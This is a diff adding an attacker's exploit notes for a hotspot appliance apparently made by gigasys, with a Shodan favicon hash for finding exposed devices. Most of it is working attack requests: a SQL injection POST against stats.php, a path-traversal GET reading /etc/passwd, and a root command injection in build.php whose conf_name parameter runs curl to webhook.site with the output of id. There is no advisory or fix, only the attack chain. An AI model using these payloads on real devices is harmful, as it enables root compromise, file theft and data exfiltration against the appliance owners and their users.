@@ -1,0 +1,35 @@
+Somebody Toucha My Spaghet
+
+http.favicon.hash:1620013509 PHPSESSID
+seems to be an appliance made by https://www.gigasys.info/
+
+multiple 302 bypass + SQLi as dba + file read AS ROOT + RCE AS FUCKING ROOT 
+
+time spent : 9h30 - 15h30
+
+[SQLI]
+POST /hotspot/stats.php HTTP/1.1
+Host: xx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://x
+Connection: close
+Cookie: PHPSESSID=xxx
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+dalladata=2022-10-07[SQLI]&alladata=2022-11-07&session=no&Cerca=Montrer
+
+
+[FILE READ]
+GET /hotspot/include/ajax_download.php?path=../etc/passwd HTTP/1.1
+
+[Root RCE]
+GET /smart/vpn/build.php?type=OVPN&conf_name=$(curl https://webhook.site/xx/$(id))&conf_file=hey
